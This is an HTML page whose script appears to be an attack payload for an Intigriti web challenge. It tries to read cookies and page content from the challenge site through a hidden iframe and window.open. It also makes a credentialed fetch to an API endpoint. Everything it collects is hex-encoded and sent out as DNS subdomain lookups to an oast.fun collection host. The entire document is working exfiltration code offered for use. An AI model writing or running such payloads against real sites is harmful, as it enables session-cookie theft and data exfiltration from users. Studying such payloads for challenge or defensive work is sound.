<!DOCTYPE html>
<html><head><title>x</title></head>
<body>
<script>
var o="da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun";
function h(s){var r='';for(var i=0;i<s.length;i++)r+=s.charCodeAt(i).toString(16).padStart(2,'0');return r}
function e(l,d){var x=h(d);var c=[];for(var i=0;i<x.length;i+=50)c.push(x.substring(i,i+50));for(var j=0;j<c.length;j++)new Image().src="http://"+l+"-"+j+"."+c[j]+"."+o+"/x";}

// Try to iframe the challenge page and read its cookies
var ifr = document.createElement('iframe');
ifr.src = "https://challenge-0826.challenges.intigriti.io/challenge";
ifr.style.display = "none";
ifr.onload = function(){
    try {
        var doc = ifr.contentDocument || ifr.contentWindow.document;
        e("ifrcookie", doc.cookie || "nocookie");
        e("ifrbody", doc.body.innerHTML.substring(0, 200));
    } catch(ex) {
        e("ifrerr", ex.toString().substring(0, 100));
    }
};
document.body.appendChild(ifr);

// Also try window.open to challenge page
setTimeout(function(){
    try {
        var w = window.open("https://challenge-0826.challenges.intigriti.io/challenge");
        setTimeout(function(){
            try {
                e("wincookie", w.document.cookie || "nocookie");
            } catch(ex) {
                e("winerr", ex.toString().substring(0, 100));
            }
        }, 2000);
    } catch(ex) {
        e("winopenerr", ex.toString().substring(0, 80));
    }
}, 500);

// Also: fetch the challenge's API endpoint to see if bot has special session
fetch("https://challenge-0826.challenges.intigriti.io/api/channels/11/load", {credentials:'include'})
    .then(r => r.text())
    .then(t => e("ch11resp", t.substring(0,100)))
    .catch(ex => e("ch11err", ex.toString().substring(0,80)));

// Ping to confirm script ran
new Image().src = "http://v5ping." + o + "/";
</script>
</body>
</html>
